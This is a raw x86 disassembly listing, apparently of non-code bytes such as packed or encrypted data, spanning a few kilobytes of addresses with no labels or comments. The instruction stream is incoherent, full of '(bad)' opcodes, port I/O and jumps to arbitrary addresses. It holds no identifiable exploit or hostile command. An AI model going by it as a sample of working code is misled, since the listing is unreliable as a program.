  4124be:	leave  
  4124bf:	inc    edi
  4124c0:	dec    ebx
  4124c1:	rcr    DWORD PTR ds:0x39913c04,cl
  4124c7:	fdiv   st(4),st
  4124c9:	lahf   
  4124ca:	xlat   BYTE PTR ds:[ebx]
  4124cb:	(bad)  
  4124cd:	mov    WORD PTR [ebp+esi*1-0x2f],cs
  4124d1:	out    dx,eax
  4124d2:	scas   eax,DWORD PTR es:[edi]
  4124d3:	pop    ebp
  4124d4:	mov    dh,0xa1
  4124d6:	jmp    0x4124d8
  4124d8:	loop   0x412476
  4124da:	add    al,0x2a
  4124dc:	mov    BYTE PTR ds:0x5f784ed0,cl
  4124e2:	push   eax
  4124e3:	lock add esi,DWORD PTR [eax+ebp*8-0x48]
  4124e8:	push   0xffffffc1
  4124ea:	mov    ch,BYTE PTR [ebp-0x338e74b9]
  4124f0:	lahf   
  4124f1:	mov    esp,0x8439ae32
  4124f6:	fmul   DWORD PTR [edx-0x1034ea43]
  4124fc:	mov    WORD PTR [edi],?
  4124fe:	and    eax,0x7672993c
  412503:	paddb  mm6,QWORD PTR [esp+eax*1]
  412507:	mov    eax,ds:0xc09562de
  41250c:	and    edx,DWORD PTR [ecx]
  41250e:	gs xor al,ch
  412511:	pop    ecx
  412512:	inc    esi
  412513:	mov    dl,0x61
  412515:	scas   eax,DWORD PTR es:[edi]
  412516:	mov    edx,0x1f1bd7c4
  41251b:	xchg   edx,eax
  41251c:	and    bl,BYTE PTR [si]
  41251f:	lds    dx,DWORD PTR [ebp-0x5d6dc2f1]
  412526:	inc    edx
  412527:	cs enter 0x6cd0,0x1c
  41252c:	call   0x39819394
  412531:	lods   eax,DWORD PTR ds:[esi]
  412532:	inc    ecx
  412533:	and    esp,eax
  412535:	dec    ebp
  412536:	jp     0x4124c2
  412538:	inc    ebx
  412539:	sbb    ch,BYTE PTR [esi+edi*4+0x48048095]
  412540:	add    dl,ch
  412542:	fimul  WORD PTR [ebp+0x4d]
  412545:	or     al,0x50
  412547:	mov    dh,0x3e
  412549:	popa   
  41254a:	inc    eax
  41254b:	dec    ebp
  41254c:	lods   al,BYTE PTR ds:[esi]
  41254d:	outs   dx,BYTE PTR ds:[esi]
  41254e:	sar    ebp,0xb3
  412551:	mov    edx,0x8405b3b0
  412556:	push   esp
  412557:	imul   edi,DWORD PTR [esi+0x6f],0x2c2704d7
  41255e:	int3   
  41255f:	push   ss
  412560:	call   DWORD PTR [ebx]
  412562:	sub    BYTE PTR [esi],0x74
  412565:	or     al,BYTE PTR [edi+0x62]
  412568:	stos   DWORD PTR es:[edi],eax
  412569:	xchg   DWORD PTR [ecx+0x75121a1d],edi
  41256f:	inc    esp
  412570:	dec    eax
  412571:	add    BYTE PTR [esi],ch
  412573:	stos   BYTE PTR es:[edi],al
  412574:	sub    eax,0x448f1c6b
  412579:	sub    DWORD PTR [ebx-0x7009f5f3],0xffffffe7
  412580:	push   esp
  412581:	fst    DWORD PTR [esi]
  412583:	inc    edi
  412584:	imul   edx,DWORD PTR [esi],0x38
  412587:	jmp    DWORD PTR ds:0xef7b08d3
  41258d:	std    
  41258e:	push   eax
  41258f:	pop    esp
  412590:	js     0x412610
  412592:	ret    
  412593:	add    BYTE PTR [ebp+0x3b],ah
  412596:	sub    ebx,edi
  412598:	mov    eax,ds:0x307b8f7c
  41259d:	xchg   ebx,eax
  41259e:	jmp    0x8650146a
  4125a3:	or     eax,0xcc20a7a7
  4125a8:	shr    BYTE PTR [esi+ecx*1-0x41597532],1
  4125af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125b0:	mov    eax,ds:0xb7ad6393
  4125b5:	mov    edi,0x60709fad
  4125ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125bb:	xlat   BYTE PTR ds:[ebx]
  4125bc:	ins    BYTE PTR es:[edi],dx
  4125bd:	sub    eax,DWORD PTR [ebx]
  4125bf:	mov    bl,0x43
  4125c1:	pop    ss
  4125c2:	push   es
  4125c3:	cwde   
  4125c4:	mov    WORD PTR [ecx-0x636088e3],?
  4125ca:	pop    es
  4125cb:	int3   
  4125cc:	gs aas 
  4125ce:	cmp    al,0x69
  4125d0:	addr16 push 0x7f
  4125d3:	mov    ebp,0xa022db63
  4125d8:	stos   BYTE PTR es:[edi],al
  4125d9:	out    0xcb,al
  4125db:	int3   
  4125dc:	cwde   
  4125dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125de:	outs   dx,BYTE PTR ds:[esi]
  4125df:	mov    WORD PTR [ebx-0x51],cs
  4125e2:	xchg   esp,eax
  4125e3:	mov    dl,0x86
  4125e5:	dec    esp
  4125e6:	lock popf 
  4125e8:	scas   al,BYTE PTR es:[edi]
  4125e9:	in     eax,0x33
  4125eb:	xor    edi,DWORD PTR [esi+0x1ca00d2b]
  4125f1:	stc    
  4125f2:	pop    ds
  4125f3:	sub    DWORD PTR [ecx],edx
  4125f5:	push   ss
  4125f6:	jae    0x412666
  4125f8:	adc    dh,al
  4125fa:	leave  
  4125fb:	push   edx
  4125fc:	scas   al,BYTE PTR es:[edi]
  4125fd:	jp     0x41260d
  4125ff:	cmp    eax,0xdf32a268
  412604:	out    dx,al
  412605:	sar    DWORD PTR [edx+0x7ef8c190],cl
  41260b:	xchg   DWORD PTR [ecx+edx*8-0x65678229],esp
  412612:	mov    eax,0x430fb3b7
  412617:	cmp    BYTE PTR [edi-0x32],dh
  41261a:	daa    
  41261b:	inc    eax
  41261c:	mov    ebx,0x3198041f
  412621:	inc    ecx
  412622:	inc    ecx
  412623:	stos   BYTE PTR es:[edi],al
  412624:	int    0xc3
  412626:	js     0x41267d
  412628:	pop    ebp
  412629:	pop    esi
  41262a:	sub    DWORD PTR [esp],esp
  41262d:	hlt    
  41262e:	mov    BYTE PTR ds:0xda4e87bc,cl
  412634:	cmp    esp,edi
  412636:	pop    esi
  412637:	push   ebx
  412638:	dec    eax
  412639:	jl     0x4125cc
  41263b:	(bad)  
  41263c:	popa   
  41263d:	push   ebp
  41263e:	fst    QWORD PTR [edx+esi*2+0x491e180f]
  412645:	fs jge 0x41263b
  412648:	sub    al,0x7d
  41264a:	out    0xaa,al
  41264c:	xor    ebp,DWORD PTR ds:0x14df55ef
  412652:	stos   BYTE PTR es:[edi],al
  412653:	mov    ebx,0x499dd5df
  412658:	fwait
  412659:	cli    
  41265a:	dec    esp
  41265b:	lea    ebx,[eax+edx*4]
  41265e:	js     0x412657
  412660:	inc    edi
  412661:	ret    0x3183
  412664:	out    dx,al
  412665:	stos   DWORD PTR es:[edi],eax
  412666:	cmp    ch,BYTE PTR [ebx+0x33]
  412669:	popa   
  41266a:	cli    
  41266b:	test   eax,0x813fea33
  412670:	push   edi
  412671:	push   ecx
  412672:	pop    es
  412673:	je     0x4126f1
  412675:	mov    WORD PTR [ebx],ds
  412677:	xchg   ebx,eax
  412678:	lods   al,BYTE PTR ds:[esi]
  412679:	and    al,0x32
  41267b:	cmp    esp,DWORD PTR [eax-0x80]
  41267e:	sbb    ebp,ebp
  412680:	mov    BYTE PTR [ebx+0x36419f20],bl
  412686:	test   bl,bl
  412688:	ss ins DWORD PTR es:[edi],dx
  41268a:	jp     0x4126b5
  41268c:	cmp    DWORD PTR [ecx-0x72],ebp
  41268f:	into   
  412690:	xor    eax,0xbe8b150e
  412695:	and    eax,0x8b32d68e
  41269a:	rol    DWORD PTR [esi-0x13ab7c74],cl
  4126a0:	in     al,0x32
  4126a2:	pop    ebx
  4126a3:	loop   0x41265f
  4126a5:	call   eax
  4126a7:	and    BYTE PTR [ecx+0x6c],bh
  4126aa:	rol    BYTE PTR [esi],1
  4126ac:	dec    ecx
  4126ad:	lahf   
  4126ae:	xchg   ecx,eax
  4126af:	sub    DWORD PTR [ecx+0x69],0xe35598d0
  4126b6:	dec    ebp
  4126b7:	in     eax,0xb3
  4126b9:	scas   al,BYTE PTR es:[edi]
  4126ba:	test   al,0x6
  4126bc:	cdq    
  4126bd:	inc    ebp
  4126be:	dec    eax
  4126bf:	sahf   
  4126c0:	push   es
  4126c1:	call   0x9912704a
  4126c6:	inc    edx
  4126c7:	jnp    0x41268d
  4126c9:	xchg   ecx,eax
  4126ca:	pop    ds
  4126cb:	lock add esp,DWORD PTR [ebx-0x1be8058b]
  4126d2:	imul   esi,DWORD PTR [ecx+esi*8-0x25],0xed3bd1b7
  4126da:	das    
  4126db:	pop    edi
  4126dc:	mov    ch,0xf6
  4126de:	into   
  4126df:	push   eax
  4126e0:	mov    ebp,0xbfa1f3e3
  4126e5:	sub    bh,dh
  4126e7:	lahf   
  4126e8:	sbb    BYTE PTR [esi+0x67],dh
  4126eb:	ins    DWORD PTR es:[edi],dx
  4126ec:	out    dx,al
  4126ed:	stc    
  4126ee:	out    dx,eax
  4126ef:	icebp  
  4126f0:	push   cs
  4126f1:	push   ds
  4126f2:	mov    ebx,0x25482f7d
  4126f7:	and    DWORD PTR ds:0x6c9e1b23,ebp
  4126fd:	mov    DWORD PTR [ebp-0x52],0xf20602c5
  412704:	and    al,0xe6
  412706:	dec    ebx
  412707:	or     ebx,DWORD PTR [ebx]
  412709:	and    al,0x45
  41270b:	(bad)  
  41270e:	jno    0x4126d1
  412710:	sub    al,0x6b
  412712:	gs mov esp,edx
  412715:	ins    BYTE PTR es:[edi],dx
  412716:	(bad)  
  412717:	mov    cl,0x39
  412719:	clc    
  41271a:	jmp    0x4126bf
  41271c:	add    dl,ch
  41271e:	xchg   ch,al
  412720:	jno    0x412743
  412722:	adc    DWORD PTR [ecx],edx
  412724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412725:	sbb    esi,0xfffffffd
  412728:	mov    esp,0xf06607b4
  41272d:	in     al,dx
  41272e:	xchg   DWORD PTR [ecx],eax
  412730:	xchg   edi,eax
  412731:	inc    ecx
  412732:	push   ss
  412733:	or     DWORD PTR [edi+0x19],0x8c9c3ceb
  41273a:	mov    dh,0x27
  41273c:	mov    ah,0xcd
  41273e:	ja     0x412777
  412740:	test   al,0x31
  412742:	lock push esp
  412744:	nop
  412745:	inc    ebp
  412746:	ins    BYTE PTR es:[edi],dx
  412747:	dec    ecx
  412748:	and    eax,DWORD PTR [ecx+0x48]
  41274b:	fidiv  DWORD PTR ds:0x98c61490
  412751:	sbb    DWORD PTR [edx],esp
  412753:	(bad)  [esi+0x58]
  412756:	jecxz  0x412701
  412758:	ins    BYTE PTR es:[edi],dx
  412759:	icebp  
  41275a:	mov    esp,DWORD PTR [edx-0xd]
  41275d:	enter  0x1c7a,0x79
  412761:	in     al,0xcd
  412763:	xchg   ebx,eax
  412764:	add    BYTE PTR [eax-0x75882e7a],0x35
  41276b:	mov    bh,0xd2
  41276d:	inc    ebp
  41276e:	mov    cl,0x37
  412770:	cmp    DWORD PTR [esi+edi*1+0x5f],ebx
  412774:	repz test eax,0x8ba4239e
  41277a:	inc    ecx
  41277b:	push   ss
  41277c:	and    al,0x62
  41277e:	adc    ebx,DWORD PTR [eax+ebx*4+0x76380676]
  412785:	lods   al,BYTE PTR ds:[esi]
  412786:	push   eax
  412787:	sbb    al,0x4a
  412789:	sub    al,0x69
  41278b:	mov    ds:0x6e9795d0,eax
  412790:	outs   dx,DWORD PTR ds:[esi]
  412791:	inc    eax
  412792:	sahf   
  412793:	bound  bx,DWORD PTR [edi+0x2516d70]
  41279a:	scas   al,BYTE PTR es:[edi]
  41279b:	jmp    0x412817
  41279d:	adc    bh,dl
  41279f:	xchg   ecx,eax
  4127a0:	cmp    ecx,ebx
  4127a2:	fcom   QWORD PTR es:[esi-0x711dfb22]
  4127a9:	jo     0x4127f1
  4127ab:	scas   eax,DWORD PTR es:[edi]
  4127ac:	or     DWORD PTR ds:0x95dbf934,ecx
  4127b2:	retf   0x47de
  4127b5:	xor    eax,0x1b3b3979
  4127ba:	fmul   QWORD PTR [edi-0xc]
  4127bd:	gs push ss
  4127bf:	stc    
  4127c0:	add    cl,ah
  4127c2:	mov    al,ds:0x14f647e9
  4127c7:	je     0x412802
  4127c9:	adc    al,0x6b
  4127cb:	test   DWORD PTR [eax-0x67f637c5],esi
  4127d1:	cmp    ah,BYTE PTR [ecx]
  4127d3:	scas   eax,DWORD PTR es:[edi]
  4127d4:	call   0x38414289
  4127d9:	dec    edi
  4127da:	mov    ecx,0xa57ba74f
  4127df:	mov    edx,ecx
  4127e1:	inc    esp
  4127e2:	adc    al,0x6c
  4127e4:	mov    ds:0x206d9cd3,eax
  4127e9:	pop    ss
  4127ea:	ds push ecx
  4127ec:	lods   al,BYTE PTR ds:[esi]
  4127ed:	stos   DWORD PTR es:[edi],eax
  4127ee:	mov    DWORD PTR [eax-0x4],ecx
  4127f1:	pop    edx
  4127f2:	xchg   ecx,eax
  4127f3:	jb     0x4127e4
  4127f5:	jno    0x4127d7
  4127f7:	cmp    ebp,eax
  4127f9:	retf   
  4127fa:	es cmp DWORD PTR fs:[edx+0x25],edx
  4127ff:	stos   DWORD PTR es:[edi],eax
  412800:	mov    esp,0x36751876
  412805:	gs jge 0x412792
  412808:	mov    ebp,esp
  41280a:	add    al,0x8d
  41280c:	sahf   
  41280d:	popf   
  41280e:	loopne 0x4127cd
  412810:	xor    eax,0x8b50348e
  412815:	leave  
  412816:	(bad)  
  412817:	stos   DWORD PTR es:[edi],eax
  412818:	inc    ebp
  412819:	pop    edi
  41281a:	sbb    DWORD PTR [eax],eax
  41281c:	mov    WORD PTR [ecx+0x11],ds
  41281f:	add    eax,0x17ebe90d
  412824:	adc    cl,ah
  412826:	inc    ebp
  412827:	pop    ebp
  412828:	xchg   BYTE PTR [edx+0x7e],al
  41282b:	ins    BYTE PTR es:[edi],dx
  41282c:	and    dl,BYTE PTR [ecx+0x6b]
  41282f:	mov    ebp,?
  412831:	jmp    0xda1b:0xe024c670
  412838:	mov    esi,DWORD PTR [ecx*4-0x2bcb57b6]
  41283f:	inc    ebx
  412840:	mul    DWORD PTR [ecx+eax*8-0x68b4e07]
  412847:	call   0xd047:0x3d0d
  41284d:	jmp    0x412861
  41284f:	shl    ebx,0x85
  412852:	jp     0x4127ea
  412854:	rcl    DWORD PTR [ecx+0x2e],cl
  412857:	out    dx,al
  412858:	adc    ebp,edi
  41285a:	and    bl,bh
  41285c:	push   esi
  41285d:	dec    ebp
  41285e:	sub    DWORD PTR [esi],eax
  412860:	push   ebp
  412861:	jbe    0x41287b
  412863:	mov    ch,0x75
  412865:	int    0xb6
  412867:	stos   DWORD PTR es:[edi],eax
  412868:	mov    ebx,0x692beaa9
  41286d:	sub    DWORD PTR [ecx],esi
  41286f:	into   
  412870:	adc    BYTE PTR [eax-0x24ae5f0f],ch
  412876:	mov    al,0x8b
  412878:	idiv   ebx
  41287a:	int3   
  41287b:	add    al,BYTE PTR [ebx-0x5d]
  41287e:	lods   al,BYTE PTR ds:[esi]
  41287f:	fistp  DWORD PTR [eax-0x79]
  412882:	push   ecx
  412883:	and    al,0x35
  412885:	mov    ebx,0xe9a65b9d
  41288a:	in     al,0xd4
  41288c:	enter  0x29e,0x2a
  412890:	xchg   ebp,eax
  412891:	shl    BYTE PTR [esi-0xf],1
  412894:	jle    0x4128c6
  412896:	mov    DWORD PTR [ecx-0x1e],edi
  412899:	imul   edi,DWORD PTR [edi+0x277c0b2c],0xfffffffe
  4128a0:	scas   eax,DWORD PTR es:[edi]
  4128a1:	mov    esp,0x442d988
  4128a6:	inc    esi
  4128a7:	imul   edi,DWORD PTR [eax+eax*8],0x18d875
  4128ae:	inc    eax
  4128af:	xchg   esi,eax
  4128b0:	fstp   DWORD PTR [eax-0x5f4815a3]
  4128b6:	out    dx,al
  4128b7:	das    
  4128b8:	xchg   ebx,eax
  4128b9:	jmp    0xf55b:0xa127
  4128bf:	jbe    0x41289a
  4128c1:	push   esp
  4128c2:	js     0x4128f4
  4128c4:	(bad)  
  4128c5:	push   ebx
  4128c6:	loope  0x41290d
  4128c8:	call   0x5b322b15
  4128cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128ce:	cld    
  4128cf:	in     eax,dx
  4128d0:	(bad)  
  4128d1:	call   0x30d:0x65453496
  4128d8:	pop    ebp
  4128d9:	adc    BYTE PTR [esp+eax*4-0x39],bl
  4128dd:	cmp    al,0x50
  4128df:	dec    eax
  4128e0:	xlat   BYTE PTR ds:[ebx]
  4128e1:	push   ds
  4128e2:	dec    DWORD PTR [ebx+0x37]
  4128e5:	outs   dx,BYTE PTR ds:[esi]
  4128e6:	fwait
  4128e7:	cli    
  4128e8:	jbe    0x41292b
  4128ea:	xor    dl,dh
  4128ec:	inc    eax
  4128ed:	in     al,0xb5
  4128ef:	mov    DWORD PTR [eax+eiz*4-0x59ccb199],esp
  4128f6:	dec    ebp
  4128f7:	mov    esp,0xc4409329
  4128fc:	test   BYTE PTR [ebx+eiz*4],dl
  4128ff:	xor    BYTE PTR [eax],al
  412901:	mov    ch,0x50
  412903:	fst    DWORD PTR [ecx]
  412905:	(bad)  
  412906:	outs   dx,BYTE PTR ds:[esi]
  412907:	scas   eax,DWORD PTR es:[edi]
  412908:	retf   
  412909:	cwde   
  41290a:	frstor [ebx+0x7af66f2d]
  412910:	dec    esi
  412911:	repz enter 0x25ed,0xb2
  412916:	mov    bl,0x12
  412918:	fild   QWORD PTR [esi-0xc]
  41291b:	sbb    cl,al
  41291d:	inc    ecx
  41291e:	icebp  
  41291f:	out    0xfa,al
  412921:	js     0x412991
  412923:	jp     0x4128a9
  412925:	inc    edi
  412926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412927:	push   ebp
  412928:	inc    esp
  412929:	or     eax,DWORD PTR [ecx+0x79]
  41292c:	mov    fs,WORD PTR [edi-0x36]
  41292f:	push   eax
  412930:	adc    ebp,DWORD PTR [esp+edx*8]
  412933:	add    ah,cl
  412935:	cmp    DWORD PTR [ecx+0x4a],ebp
  412938:	or     DWORD PTR [ebx+eiz*4-0x4d68a22b],edi
  41293f:	xor    ebp,edi
  412941:	mov    bh,0x31
  412943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412944:	ins    DWORD PTR es:[edi],dx
  412945:	dec    ebx
  412946:	and    BYTE PTR [esi+ebp*1],dl
  412949:	xor    al,0x6d
  41294b:	jnp    0x41292f
  41294d:	sbb    ah,ch
  41294f:	lds    eax,FWORD PTR [ebx-0x24]
  412952:	cmp    BYTE PTR [esi],ah
  412954:	aam    0x9e
  412956:	mov    esp,0xd5857886
  41295b:	ins    BYTE PTR es:[edi],dx
  41295c:	pop    ss
  41295d:	pop    ds
  41295e:	mov    eax,DWORD PTR [esp+eax*4-0x463dc892]
  412965:	push   esi
  412966:	stos   DWORD PTR es:[edi],eax
  412967:	fisttp DWORD PTR [eax-0x32b0ed2a]
  41296d:	and    cl,BYTE PTR [ebp+eax*4+0x3b]
  412971:	and    eax,0x66167e95
  412976:	xchg   ecx,eax
  412977:	test   al,0x78
  412979:	mov    gs,edx
  41297b:	mov    BYTE PTR [ebx+0x7c959ca1],al
  412981:	cld    
  412982:	test   esp,0x2cb83803
  412988:	int    0xa0
  41298a:	int    0x2b
  41298c:	leave  
  41298d:	push   edi
  41298e:	jno    0x41295d
  412990:	icebp  
  412991:	loop   0x412974
  412993:	inc    esi
  412994:	add    al,BYTE PTR [ebx-0x2]
  412997:	xor    dl,cl
  412999:	mov    ?,WORD PTR [ebx]
  41299b:	mov    ds,edx
  41299d:	in     al,dx
  41299e:	cwde   
  41299f:	adc    DWORD PTR [eax],ebx
  4129a1:	stos   DWORD PTR es:[edi],eax
  4129a2:	push   0xffffffc8
  4129a4:	pop    edx
  4129a5:	add    eax,0xcef839cf
  4129aa:	jge    0x412a14
  4129ac:	int3   
  4129ad:	retf   
  4129ae:	sqrtps xmm0,XMMWORD PTR [ecx+0x79]
  4129b2:	push   edx
  4129b3:	sahf   
  4129b4:	push   es
  4129b5:	int    0xb4
  4129b7:	adc    al,0xd
  4129b9:	aad    0xe4
  4129bb:	mov    edx,0x69090e66
  4129c0:	test   DWORD PTR [ecx+0x2],0x44131fe
  4129c7:	add    ebx,DWORD PTR [edx-0x61]
  4129ca:	idiv   DWORD PTR [esi]
  4129cc:	es stos DWORD PTR es:[edi],eax
  4129ce:	dec    esi
  4129cf:	jb     0x412a4a
  4129d1:	dec    edx
  4129d2:	shr    BYTE PTR [edi],0x1d
  4129d5:	imul   esi,ebp,0x609b0051
  4129db:	add    al,0x97
  4129dd:	fild   WORD PTR [eax]
  4129df:	sbb    DWORD PTR [esi+0x25],0xbccac975
  4129e6:	pop    edx
  4129e7:	aad    0xff
  4129e9:	sbb    esp,esi
  4129eb:	rcl    DWORD PTR [ebp+0x2e07d382],0xba
  4129f2:	push   esp
  4129f3:	lea    ebp,[esi-0x4f6781a9]
  4129f9:	popa   
  4129fa:	push   es
  4129fb:	pop    esp
  4129fc:	jo     0x412a76
  4129fe:	(bad)  
  412a00:	cdq    
  412a01:	jo     0x4129f9
  412a03:	mov    ds:0x20c7554e,al
  412a08:	push   ss
  412a09:	mov    bl,0xca
  412a0b:	neg    DWORD PTR [eax]
  412a0d:	add    al,0xe3
  412a0f:	clc    
  412a10:	repnz mov ecx,0x566433c5
  412a16:	add    bh,BYTE PTR [edx+0x52]
  412a19:	icebp  
  412a1a:	dec    esp
  412a1b:	repnz cs mov esp,ss
  412a1f:	and    DWORD PTR [edi+0x36],esi
  412a22:	les    ebx,FWORD PTR [eax-0x2c]
  412a25:	jns    0x4129ae
  412a27:	push   esi
  412a28:	arpl   bp,bx
  412a2a:	js     0x412a71
  412a2c:	jne    0x412a7f
  412a2e:	mov    ah,0x6b
  412a30:	sbb    DWORD PTR [ecx+edi*2-0x52],edx
  412a34:	iret   
  412a35:	(bad)  
  412a36:	mov    bl,0x2a
  412a38:	les    eax,FWORD PTR [esi-0x6c0d4cd3]
  412a3e:	ds or  ah,0xbb
  412a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a43:	sbb    al,0xe6
  412a45:	inc    eax
  412a46:	shr    BYTE PTR ds:0x82bd0054,cl
  412a4c:	(bad)  
  412a4d:	out    0x99,al
  412a4f:	sbb    DWORD PTR [ecx],esi
  412a51:	lods   al,BYTE PTR ds:[esi]
  412a52:	dec    edx
  412a53:	popf   
  412a54:	sub    DWORD PTR [ecx],ecx
  412a56:	pop    ss
  412a57:	cmp    al,0xf2
  412a59:	imul   DWORD PTR [ecx-0x3ca1ba33]
  412a5f:	jo     0x412ab1
  412a61:	aam    0x54
  412a63:	loop   0x412a96
  412a65:	xchg   ecx,eax
  412a66:	sbb    al,0xd9
  412a68:	push   es
  412a69:	out    dx,eax
  412a6a:	daa    
  412a6b:	xchg   ebx,eax
  412a6c:	add    cl,bl
  412a6e:	cmp    edx,ecx
  412a70:	imul   edi,ebp,0x3f674d25
  412a76:	bound  ebp,QWORD PTR [ebp+0x19]
  412a79:	jbe    0x412a24
  412a7b:	clc    
  412a7c:	cmp    al,0x6c
  412a7e:	sub    al,0xa4
  412a80:	sahf   
  412a81:	test   eax,0x64f2f8b6
  412a87:	ret    0x4acd
  412a8a:	mov    al,ds:0x2c524e62
  412a8f:	or     DWORD PTR [ebx],0xaac75c7d
  412a95:	sahf   
  412a96:	in     eax,dx
  412a97:	fnstenv [ebx]
  412a99:	ins    DWORD PTR es:[edi],dx
  412a9a:	das    
  412a9b:	dec    ebp
  412a9c:	mov    edi,DWORD PTR [esi+0x2e]
  412a9f:	mov    esp,0xe8bc4d56
  412aa4:	jmp    0xf266:0xb401d879
  412aab:	and    al,0x29
  412aad:	out    dx,al
  412aae:	xor    DWORD PTR [edi-0x1f3f02f1],edi
  412ab4:	ret    0x1a7d
  412ab7:	jae    0x412b1b
  412ab9:	int    0x10
  412abb:	inc    ecx
  412abc:	mov    dl,0x93
  412abe:	or     eax,DWORD PTR [ecx+0x3ed63590]
  412ac4:	in     eax,dx
  412ac5:	sub    al,0x3a
  412ac7:	xchg   BYTE PTR [esi+0x33],dh
  412aca:	lea    ebp,[eax]
  412acc:	lahf   
  412acd:	adc    bl,bh
  412acf:	push   ebx
  412ad0:	in     al,0x6a
  412ad2:	inc    edx
  412ad3:	push   ebp
  412ad4:	bound  ebx,QWORD PTR [ecx]
  412ad6:	sub    esi,edi
  412ad8:	dec    edi
  412ad9:	aaa    
  412ada:	out    dx,eax
  412adb:	nop
  412adc:	jne    0x412a7f
  412ade:	ja     0x412af1
  412ae0:	add    BYTE PTR [eax+0x235efe5a],cl
  412ae6:	gs (bad) 
  412ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ae9:	mov    esp,0xaacb484c
  412aee:	or     edx,DWORD PTR [ebx+0x2c8b6c73]
  412af4:	mov    edi,0xe58afb8f
  412af9:	mov    al,ds:0x6e3be436
  412afe:	clc    
  412aff:	js     0x412b59
  412b01:	mov    dl,0x6b
  412b03:	sub    al,0x4a
  412b05:	fnstcw WORD PTR [esi-0x54]
  412b08:	pop    ebp
  412b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b0a:	dec    esp
  412b0b:	ret    0xd75d
  412b0e:	je     0x412a93
  412b10:	add    cl,BYTE PTR [ecx+0x4e]
  412b13:	call   DWORD PTR [eax-0x4b]
  412b16:	addr16 inc eax
  412b18:	mov    al,ds:0x9a4ec0ec
  412b1d:	adc    BYTE PTR [eax],bl
  412b1f:	inc    ebp
  412b20:	mov    edx,0x69b15a8
  412b25:	in     al,0x81
  412b27:	js     0x412b8a
  412b29:	daa    
  412b2a:	mov    esp,0x2747ef89
  412b2f:	ja     0x412b19
  412b31:	lods   eax,DWORD PTR ds:[esi]
  412b32:	jmp    0x412baa
  412b34:	xlat   BYTE PTR ds:[ebx]
  412b35:	and    BYTE PTR [eax-0x3d],al
  412b38:	arpl   WORD PTR [ebx-0x2c],bx
  412b3b:	and    ebp,edi
  412b3d:	scas   al,BYTE PTR es:[edi]
  412b3e:	xchg   cl,dh
  412b40:	push   ss
  412b41:	pop    DWORD PTR [edx-0x3a60d25e]
  412b47:	mov    ds:0x57626c2e,eax
  412b4c:	add    BYTE PTR [edx],dl
  412b4e:	in     eax,dx
  412b4f:	cmp    ebp,ebp
  412b51:	mov    ch,0x12
  412b53:	fild   QWORD PTR [edx]
  412b55:	adc    al,0xdb
  412b57:	repnz popf 
  412b59:	mov    ch,BYTE PTR [ecx]
  412b5b:	ret    0x1b88
  412b5e:	sub    ebp,edx
  412b60:	inc    ecx
  412b61:	and    ebp,DWORD PTR [ebp+0x13]
  412b64:	nop
  412b65:	add    DWORD PTR [eax],esi
  412b67:	add    BYTE PTR ds:0x9a39353,dh
  412b6d:	cmp    edi,DWORD PTR [ecx]
  412b6f:	in     eax,0x1c
  412b71:	test   eax,0x15c0738e
  412b76:	push   cs
  412b77:	leave  
  412b78:	add    eax,0x4e67e23b
  412b7d:	cmp    BYTE PTR [eax+ecx*4-0x80],cl
  412b81:	and    DWORD PTR [eax+0x392e5eb7],esp
  412b87:	cmp    ah,BYTE PTR [eax]
  412b89:	add    al,0x58
  412b8b:	test   eax,0x5e984a6a
  412b90:	je     0x412b8d
  412b92:	iret   
  412b93:	aam    0x68
  412b95:	ss retf 0x435a
  412b99:	std    
  412b9a:	or     al,ah
  412b9c:	adc    eax,0x89334ed
  412ba1:	ds test eax,0x902643d0
  412ba7:	sahf   
  412ba8:	xchg   DWORD PTR [ebx-0x7c540856],esp
  412bae:	jne    0x412b6b
  412bb0:	jge    0x412c1a
  412bb2:	test   al,0x4b
  412bb4:	out    dx,eax
  412bb5:	repnz or DWORD PTR ds:0xda366e1a,ecx
  412bbc:	pop    edx
  412bbd:	cmc    
  412bbe:	push   esp
  412bbf:	xchg   DWORD PTR [ebx+0x0],ecx
  412bc2:	imul   DWORD PTR [edi+0x6e]
  412bc5:	push   0x1b495d80
  412bca:	mov    ecx,0x770025b8
  412bcf:	push   ebp
  412bd0:	loopne 0x412bb1
  412bd2:	inc    ebx
  412bd3:	xor    eax,0xe1066a68
  412bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bd9:	and    eax,0x8ecc0de1
  412bde:	arpl   ax,dx
  412be0:	add    BYTE PTR [ecx],0x7d
  412be3:	push   edx
  412be4:	cwde   
  412be5:	push   esp
  412be6:	jp     0x412c08
  412be8:	lock mov esi,0x540bf1cd
  412bee:	xor    esp,eax
  412bf0:	gs xchg ebx,eax
  412bf2:	pop    esi
  412bf3:	ret    0xc14d
  412bf6:	jmp    0x23b4bcbc
  412bfb:	popa   
  412bfc:	pusha  
  412bfd:	xchg   ecx,eax
  412bfe:	aam    0xef
  412c00:	push   ecx
  412c01:	add    edx,edx
  412c03:	or     dl,bh
  412c05:	push   edx
  412c06:	js     0x412bf8
  412c08:	push   0x8e0a3045
  412c0d:	push   es
  412c0e:	mov    cl,0x30
  412c10:	idiv   BYTE PTR [edx+0x3abc7b4f]
  412c16:	ins    DWORD PTR es:[edi],dx
  412c17:	sbb    eax,0x5b0ca743
  412c1c:	cmp    cl,bh
  412c1e:	pusha  
  412c1f:	clc    
  412c20:	jbe    0x412bd8
  412c22:	inc    cx
  412c24:	pop    ecx
  412c25:	out    dx,al
  412c26:	inc    ebp
  412c27:	jmp    0x4fb90f59
  412c2c:	sbb    eax,0x8f14a776
  412c31:	add    al,0x5c
  412c33:	ret    
  412c34:	adc    ebp,DWORD PTR [edi+eiz*4+0x3b415260]
  412c3b:	fild   DWORD PTR [edi+0x7af10fb9]
  412c41:	push   ds
  412c42:	(bad)  
  412c43:	call   0xbaac8eb8
  412c48:	in     al,dx
  412c49:	das    
  412c4a:	sub    BYTE PTR [eax+0x2a],ah
  412c4d:	and    eax,0x5dc060d9
  412c52:	xchg   esp,eax
  412c53:	inc    edx
  412c54:	nop
